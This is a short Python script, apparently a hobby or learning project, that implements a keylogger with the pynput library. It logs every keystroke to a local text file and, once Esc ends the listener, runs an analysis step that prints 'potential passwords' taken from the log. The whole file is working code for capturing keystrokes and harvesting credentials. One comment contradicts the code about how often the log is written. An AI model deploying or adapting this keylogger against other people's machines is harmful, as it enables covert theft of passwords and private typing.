# Modules needed
#--------------------------------
import pynput
from pynput import keyboard
from pynput.keyboard import Key, Listener
from loggerAnalyse.analyse import analyse_file
#--------------------------------

# Variables
count = 0
keys = []



# This function is called when a key is pressed
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    # Every 7 keys we will write the logs to the txt file
    if count >= 3:
        count = 0
        write_file(keys)
        keys.clear()

# We will store the logs for future use
def write_file(keys):
    # Covert certain keys to the text version e.g. Key.enter -> \n
    with open("log.txt","a") as f:
        for key in keys:
            if key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace:
                pass
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            else:
                # Keys are registered as 'a' 'b' 'c', so we must strip the ' character
                f.write(str(key).strip("'"))

# This function is called on the release of a key
def on_release(key):
    # If the key is the escape key, we will end the logger.
    if key == Key.esc:
        return False

'''We use the context manager to ensure the function will be properly handled once it has finished
The Listener object takes two parameters, first defines the function to call on a key press, the second is 
which function to call on a key release

The .join() method will keey the Listener active until a value of False is returned
'''
with Listener(on_press,on_release) as listener:
    print("\n")
    print(f"{'*'*50}")
    print("Keylogger loaded, listening...".center(50))
    print(f"{'*'*50}")
    listener.join()

# Call the function to analyse the logs after the listener is deactivated
password_flags = analyse_file('log.txt')

# Output the results in a meaningful way
print("\n")
print(f"{'*'*50}")
print("Potential passwords".center(50))
for password in password_flags:
    print(f"- {password}")
print(f"{'*'*50}")

